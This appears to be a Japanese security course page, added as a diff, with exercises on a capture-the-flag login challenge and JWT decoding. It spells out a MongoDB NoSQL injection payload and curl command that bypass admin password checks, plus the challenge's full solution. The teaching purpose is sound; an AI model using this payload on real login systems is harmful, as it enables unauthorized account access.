@@ -1,0 +1,96 @@
+---
+sidebar_position: 5
+---
+
+# 演習: 認証とJWT
+
+今回の講義で学んだ認証の知識を使って、Daily AlpacaHackの問題を解いてみましょう。
+
+## 演習 1: One More Login Challenge（Medium）
+
+**問題リンク**: [https://alpacahack.com/daily/challenges/one-more-login-challenge](https://alpacahack.com/daily/challenges/one-more-login-challenge)
+
+### 問題概要
+
+MongoDBを使ったログイン機能があります。`admin` ユーザーのパスワードは推測できませんが、別の方法でログインできます。
+
+### 解法のヒント
+
+1. ログインフォームにアクセスします
+2. `application/json` でデータを送信できることに注目します
+3. JSONでは文字列以外の値（オブジェクトや配列）を送信できます
+4. MongoDBのNoSQL Injectionを試します
+
+<details>
+<summary>詳しいヒント</summary>
+
+MongoDBでは、以下のようなクエリが実行される場合があります：
+
+```javascript
+db.users.findOne({ username: username, password: password })
+```
+
+JSONで `{"username": "admin", "password": {"$ne": ""}}` を送信すると、`password` が空文字列でないドキュメントにマッチします。
+
+</details>
+
+<details>
+<summary>解説</summary>
+
+NoSQL Injection（MongoDB Injection）を使います。
+
+curlでJSONを送信：
+
+```bash
+curl -X POST https://サーバーのURL/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": {"$ne": ""}}'
+```
+
+これで `password` が空でない `admin` ユーザーにマッチし、ログインできます。
+
+</details>
+
+### よくあるミス
+
+- ブラウザのフォームからはJSONを送信できません。curlを使ってください
+- `Content-Type: application/json` ヘッダーを忘れずに
+
+### 参考Writeup
+
+- [nozokareによるwriteup（GitHub）](https://github.com/nozokare/my-alpaca-ctf/blob/main/2026-04/16-daily-one-more-login-challenge/README.md)
+
+---
+
+## 演習 2: JWTのデコード練習
+
+### 課題
+
+以下のJWTをデコードして、ペイロードの内容を確認してください。
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQsW5c
+```
+
+### 解答例
+
+```bash
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
+# {"alg":"HS256","typ":"JWT"}
+
+echo "eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ" | base64 -d
+# {"user_id":1,"role":"admin"}
+```
+
+---
+
+## まとめ
+
+今回の演習で学んだこと：
+
+1. **NoSQL Injection**で認証をバイパスできる
+2. JSON形式では、文字列以外の値を送信できる
+3. MongoDBの演算子（`$ne`, `$gt` など）を悪用できる
+4. **JWT**のペイロードはBase64デコードで内容を確認できる
+
+次回は、特権昇格やセッションハイジャックなどの高度な攻撃手法を学びます。
